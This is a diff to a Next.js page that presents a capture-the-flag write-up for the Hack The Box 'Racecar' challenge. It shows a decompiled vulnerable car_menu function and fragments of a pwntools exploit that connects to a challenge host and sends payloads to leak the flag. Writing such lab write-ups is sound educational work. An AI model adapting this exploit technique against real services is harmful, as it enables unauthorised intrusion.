@@ -10,7 +10,11 @@ import { list_post } from "@/config/post";
 import hljs from "highlight.js";
 import 'highlight.js/styles/atom-one-dark.css';
 import { useEffect } from "react";
+import { Metadata } from "next";
 export default function Page() {
+    const metadata:Metadata= {
+        title: 'Racecar'
+    };
     hljs.registerLanguage('c', require('highlight.js/lib/languages/c'));
     hljs.registerLanguage('python', require('highlight.js/lib/languages/python'));
 
@@ -75,7 +79,7 @@ export default function Page() {
                     size: 400
                 }} />
                 <SubPara content={'Decompile racecar program by using decompile tools example: ghida or other ..., you can see car_menu function. This have a vulns, we can exploit from this.'} />
-                <pre className=" h-[300px]  overflow-auto my-4 border-1 rounded-[2rem] p-1"><code className="c">{`void car_menu(void)
+                <pre className=" h-[300px]  overflow-auto my-4 border-1 rounded-[2rem]"><code className="c">{`void car_menu(void)
 {
   int iVar1;
   int iVar2;
@@ -174,7 +178,7 @@ export default function Page() {
                     size: 400
                 }} />
                 <SubPara content={'I have written a Python program to exploit this vulnerability. Please remember to launch the machine on Hack The Box'}/>
-                <pre className="overflow-auto my-4 border-1 rounded-[2rem] p-1"><code className="python">{`from pwn import *
+                <pre className="overflow-auto my-4 border-1 rounded-[2rem]"><code className="python">{`from pwn import *
 flag = ''
 def send(payload):
     p = remote('94.237.58.148', 41012)
@@ -201,7 +205,7 @@ if __name__ == '__main__':
         print(f"send payload: {payload}")
         try:
             r = send(payload)
-            if b'nill' in r:
+            if b'nil' in r:
                 break
             retn += byteToChr(r).decode('latin-1')
             print(retn)
